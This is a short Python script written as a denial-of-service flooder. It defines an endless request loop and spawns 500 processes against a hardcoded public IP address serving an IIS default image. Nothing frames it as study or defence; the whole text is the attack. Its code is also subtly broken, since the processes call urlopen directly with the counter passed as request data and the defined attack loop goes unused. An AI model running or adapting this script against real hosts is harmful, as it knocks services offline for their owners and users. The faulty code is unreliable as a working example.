from urllib.request import urlopen
import multiprocessing, requests

def attack(url, num):
    print("process "+str(num)+" is on.")
    while True:
        requests.get(url)
        urlopen(url)
    print("process "+str(num)+" is off.")
        
        
for i in range(0,500):
    multiprocessing.Process(target=urlopen, args=("http://180.176.210.28/iisstart.png",i,)).start()
  
